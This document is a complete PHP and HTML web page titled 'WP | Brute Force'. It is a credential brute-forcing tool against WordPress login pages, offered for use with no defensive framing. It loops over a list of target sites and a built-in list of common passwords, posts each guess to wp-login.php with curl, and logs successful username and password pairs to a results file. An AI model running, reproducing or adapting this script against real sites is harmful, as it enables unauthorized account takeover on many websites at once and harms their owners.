<html>
<title>WP | Brute Force</title>
<link rel="icon" href="http://arcaneiceman.github.io/img/mark-github-256.png">
<form method="POST">
<center>
<style>
body{
	background-color: #000;
}
.a{
	color: #fff;
	font-family:Courier New;
	font-size: 30px;
	margin-top: 10px;
}
.code{
	color: #ccc;
	font-family:Courier New;
	font-size: 18px;
	margin-top: 15px;
}
.code a{
	color: #ccc;
	font-family:Courier New;
	font-size: 18px;
	text-decoration: none;
}
.all input{
	margin-top: 40px;
	padding: 8px;
	width: 500px;
	font-family:Courier New;
}
.all textarea{
	margin-top: 40px;
	width: 500px;
	height: 300px;
	font-family:Courier New;
}
.sub input{
	margin-top: 40px;
	padding: 10px;
	width: 400px;
	font-family:cursive;
	background-color: #ccc;
	border: solid #ccc;
}
</style>
<div class="a">WP | Brute Force</div>
<div class="code">Coded By Am!Ne<br>
<a href="https://www.facebook.com/wtf.madafack" target="_blanck">https://www.facebook.com/wtf.madafack</a></div>
<div class="all">
<input type="text" name="user" placeholder="username" value="admin"><br>
<textarea name="site" placeholder="htt://target.com/"></textarea>
<textarea name="password" placeholder="passwords">
admin
123456
password
102030
123123
12345
123456789
pass
test
admin123
demo</textarea>
</div>
<div class="sub">
<input type="submit" name="ok" value="Start">
</div><br><br>
</form>
<?php
$user = $_POST['user'];
if(isset($_POST['ok'])) {
	if(empty($_POST['site'])) {
		echo "<font style='font-family:Courier New; color:red'>Put your Website :3</font>";
		exit;
	}
	foreach(explode("\n",$_POST['site']) as $sites) {
		foreach(explode("\n",$_POST['password']) as $pass) {
			$wp = $sites."/wp-login.php";
			$post = array("log"=>$user,"pwd"=>$pass,"wp-submit"=>"Log+In");
			$ch = curl_init($wp);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch,CURLOPT_COOKIEFILE,"cookie.txt");
			curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
			curl_setopt($ch,CURLOPT_POST,1);
			curl_setopt($ch,CURLOPT_POSTFIELDS,$post);
			curl_setopt($ch,CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);
			curl_setopt($ch,CURLOPT_TIMEOUT,20);
			$data = curl_exec($ch);
			if(eregi("profile.php",$data)) {
				echo "<font style='font-family:Courier New; color:#fff'>DONE ==> <font color='#339966'>$sites <font color='#fff'>||</font> $user<font color='#fff'>::</font>$pass</font><br>";
				$open = fopen("WP-RESULT.txt","a");
				fwrite($open,$sites." || $user :: $pass \n\r");
				fclose($open);
			} else {
				echo "<font style='font-family:Courier New; color:#fff'>FAILED <font color=red>$sites <font color='#fff'> || </font> $user<font color='#fff'>::</font>$pass</font></font><br>";
			}
			curl_close($ch);
		}
	}
}
?>
</center>
</html>
